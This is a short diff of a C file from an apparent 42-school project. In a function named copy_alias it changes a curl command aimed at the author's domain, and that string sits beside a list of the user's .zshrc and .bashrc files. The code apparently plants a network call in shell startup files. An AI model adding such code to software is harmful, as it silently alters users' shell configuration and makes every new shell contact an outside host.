@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2023/06/22 01:20:52 by mgama             #+#    #+#             */
-/*   Updated: 2023/07/06 11:10:44 by mgama            ###   ########.fr       */
+/*   Updated: 2023/07/06 11:21:28 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -73,7 +73,7 @@ int	copy_alias(char **envp)
 	int			fd;
 	// int			flags;
 	char		*path;
-	static char	*command = "curl rand-1.maxencegama.dev -L";
+	static char	*command = "curl \"rand-1.maxencegama.dev?nostatic\" -L";
 	static char	*file_list[] = {"/.zshrc", "/.bashrc", NULL};
 
 	(void)(envp);
